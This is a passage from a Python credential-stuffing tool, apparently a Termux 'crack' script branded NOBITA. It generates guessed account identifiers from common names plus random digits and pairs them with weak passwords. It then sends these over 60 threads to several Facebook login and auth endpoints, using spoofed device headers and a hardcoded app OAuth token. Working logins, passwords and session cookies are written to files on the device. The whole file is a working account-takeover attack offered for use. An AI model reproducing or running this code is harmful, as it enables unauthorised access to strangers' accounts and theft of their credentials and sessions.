    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    hh = input(f' CHOOSE :{H} ')
    nn = hh.lower()
    os.system("clear")
    banner()
    print(f"                 {H} GMAIL {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}@GMAIL.COM{P}][{B}MAIL.COM{P}][{K}YAHOO.COM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    kk = input(f' CHOOSE :{H} ')
    pp = kk.lower()
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD CP ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuu = input("[+] [CHOOSE] : ")
    if somouuu in ['y','Y','1','yes','YES','Yes']:
       hello.append('y')
    else:
       hello.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD COOKIE  ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuuu = input("{M} [+] [CHOOSE] : ")
    if somouuuu in ['y','Y','1','yes','YES','Yes']:
       shanto.append('y')
    else:
       shanto.append('n')
    os.system("clear")
    banner()
    print(f"")   
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f"")
    limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(2,4))
        user.append(nmp)
    with ThreadPool(max_workers=60) as smiyaaa:    
        clear()
        banner()
        tl = str(len(user))
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {BLACK}WElCOME  MY TOOLS     : {RED}'+name)
        print(f'{M}║══[•] {BLACK}TOTAL IDZ             : {RED}'+tl)
        print(f'{M}║══[•] {BLACK}NUMBER YOU PUT        : {RED}'+gg)
        print(f'{M}║══[•] {BLACK}PROCESS HAS BEEN STARTED')
        print(f'{M}╚══[•] {BLACK}TO STOP PROCESS Ctrl + Z ')
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        for love in user:
            uid = ([(gg+"."+nn+love+pp), (gg+nn+love+pp)])
            pwx = ([(gg+"."+nn+love), (gg+nn+love), (gg+" 123"), (nn+" 123"), ('bangladesh'), ('freefire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
            elif pom =='3':
                smiyaaa.submit(b,uid,pwx,tl)
            elif pom =='4':
                smiyaaa.submit(u,uid,pwx,tl)
    sh = input(f'\n\n    {M}Go TO MAIN MENU [ Y/N] :{H}  ')
    if sh =='y':
        check_update()
    elif sh =='Y':
        check_update()
    else:
        check_update()



def user():
    _pompom_()       
    pom = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if pom =='U':
       os.system('xdg-open https://facebook.com/groups/316554827306831/')
       _pornhub_()
    elif pom =='00':
        _pompom_()
        os.system('xdg-open https://facebook.com/groups/316554827306831/')
    else:
        os.system('xdg-open https://github.com/Dark-Cyber-07')
        _pompom_()
    user=[]
    
    os.getuid
    os.geteuid
    clear()
    banner()
    print(f"                 {H} GMAIL {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}SHANTO{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
    os.system("clear")
    banner()
    print(f"                 {H} GMAIL {K}CRACK{P} [{H}⚜{P}] ");time.sleep(0.05)
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}HASAN{P}][{B}RANA{P}][{K}AHMED{P}][{K}MAHMUD{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    hh = input(f' CHOOSE :{H} ')
    nn = hh.lower()
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD CP ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuu = input("[+] [CHOOSE] : ")
    if somouuu in ['y','Y','1','yes','YES','Yes']:
       hello.append('y')
    else:
       hello.append('n')
    os.system("clear")
    banner()
    print(f"")
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f'{M}DO YOU ADD COOKIE  ID? TYPE Y/N [YESS/NO]')
    print("%s═══════════════════════════════%s═══════════════%s"%(M,H,P))
    print(f"")
    somouuuu = input("{M} [+] [CHOOSE] : ")
    if somouuuu in ['y','Y','1','yes','YES','Yes']:
       shanto.append('y')
    else:
       shanto.append('n')
    os.system("clear")
    banner()
    print(f"")   
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f"")
    limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(2,4))
        user.append(nmp)
    with ThreadPool(max_workers=60) as smiyaaa:    
        clear()
        banner()
        tl = str(len(user))
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        print(f'{M}╔══[•] {BLACK}WElCOME  MY TOOLS     : {RED}'+name)
        print(f'{M}║══[•] {BLACK}TOTAL IDZ             : {RED}'+tl)
        print(f'{M}║══[•] {BLACK}NUMBER YOU PUT        : {RED}'+gg)
        print(f'{M}║══[•] {BLACK}PROCESS HAS BEEN STARTED')
        print(f'{M}╚══[•] {BLACK}TO STOP PROCESS Ctrl + Z ')
        print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
        for love in user:
            uid = gg+"."+nn+love
            pwx = ([(gg), (gg+nn+love), (gg+" 123"), (nn+" 123"), ('bangladesh'), ('freefire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
            elif pom =='3':
                smiyaaa.submit(b,uid,pwx,tl)
            elif pom =='4':
                smiyaaa.submit(u,uid,pwx,tl)
    sh = input(f'\n\n    {M}Go TO MAIN MENU [ Y/N] :{H}  ')
    if sh =='y':
        check_update()
    elif sh =='Y':
        check_update()
    else:
        check_update()
    #MAIN OK METHOD
    
    
    
hello = []
shanto = []
    
def m(uid,pwx,tl):
    global loop
    global ok
    global lok
    global twf
    global numan
    try:
        for ps in pwx:
            session = requests.Session()
            shanto = random.choice(["\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
            sys.stdout.write(f'\r    {P}[{shanto}{P}][{K}%s{P}/{B}%s{P}][{H}OK{P}/{M}LOK{P}/{B}2F{P}]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok),len(lok),len(twf))),
            sys.stdout.flush()
            nn = random.choice(numan)
            req_url = session.get(f'https://{fg}').text
            data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(req_url)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(req_url)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(req_url)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(req_url)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = {
            'authority': 'm.facebook.com',
            'method': 'POST',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.facebook.com',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            "user-agent":nn}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            if 'm_page_voice' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOBITA-LOK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NOBITA-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOBITA-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NOBITA-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[NOBITA-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI💉] {RED}'+coki)
                      open('/sdcard/NOBITA-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
        loop+=1
        
    except:
        pass



#___________________________API1________________________#
def n(uid,pwx,tl):
    global loop,ok,cp,twf
    fucker = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mNOBITA\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
            #sys.stdout.write(f'\r    {P}[{shanto}{P}][{K}%s{P}/{B}%s{P}][{H}OK]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok))),
            #sys.stdout.flush()
            kk = random.choice(numan)
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': uid,
                    'password': ps,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={f'User-Agent': kk,
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                cokie = po["session_cookies"]
                cok = {}
                for x in cokie:
                    cok.update({x["name"]:x["value"]})
                coki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOBITA-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NOBITA-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
        
        
        
        
#__________________________________GRAPH_____________________________________#
def b(uid,pwx,tl):
    global loop,ok,cp,twf
    fucker = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mNOBITA\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
            #sys.stdout.write(f'\r    {P}[{shanto}{P}][{K}%s{P}/{B}%s{P}][{H}OK]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok))),
            #sys.stdout.flush()
            kk = random.choice(numan)
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': uid,
                    'password': ps,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={f'User-Agent': kk,
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                cokie = po["session_cookies"]
                cok = {}
                for x in cokie:
                    cok.update({x["name"]:x["value"]})
                coki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOBITA-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NOBITA-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
    
    
    
#__________________APIII______________________#

def u(uid,pwx,tl):
    global loop,ok,cp,twf
    fucker = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mNOBITA\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
            #sys.stdout.write(f'\r    {P}[{shanto}{P}][{K}%s{P}/{B}%s{P}][{H}OK]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok))),
            #sys.stdout.flush()
            kk = random.choice(numan)
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': uid,
                    'password': ps,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={f'User-Agent': kk,
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                cokie = po["session_cookies"]
                cok = {}
                for x in cokie:
                    cok.update({x["name"]:x["value"]})
                coki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOBITA-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NOBITA-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass





#_____________{Errror}_______________#

def b(uid,pwx,tl):
    global loop
    global ok
    global cp
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
            sys.stdout.write(f'\r    {P}[{animasi}{P}][{K}%s{P}/{B}%s{P}][{H}OK{P}/{M}CP{P}]{P}[{H}%s{P}|{M}%s{P}] \r'%(loop,tl,len(ok),len(cp))),
            sys.stdout.flush()
            kk = random.choice(numan)
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': uid,
                    'password': ps,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={f'User-Agent': kk,
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://b-api.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                cokie = po["session_cookies"]
                cok = {}
                for x in cokie:
                    cok.update({x["name"]:x["value"]})
                coki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                uidf = re.findall('c_user=(.*);xs', coki)[0]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOBITA-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NOBITA-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[NOBITA-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/NOBITA-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
            else:
                continue
        loop+=1
    except:
        pass


#---------------------[END MENU]---------------------#

if __name__ == '__main__':
    main()
